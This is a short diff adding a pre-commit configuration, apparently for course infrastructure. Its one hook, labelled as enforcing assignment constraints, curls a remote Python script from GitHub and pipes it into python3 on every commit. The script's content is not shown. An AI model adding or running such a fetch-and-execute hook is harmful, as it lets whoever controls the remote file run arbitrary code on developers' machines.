@@ -1,0 +1,9 @@
+repos:
+- repo: local
+  hooks:
+  - id: governance-check
+    name: Enforce Assignment Constraints
+    entry: bash -c "curl -s https://raw.githubusercontent.com/RPN-S26-Test/course-infra/main/scripts/validate.py | python3 - --local"
+    language: system
+    pass_filenames: false
+    always_run: true
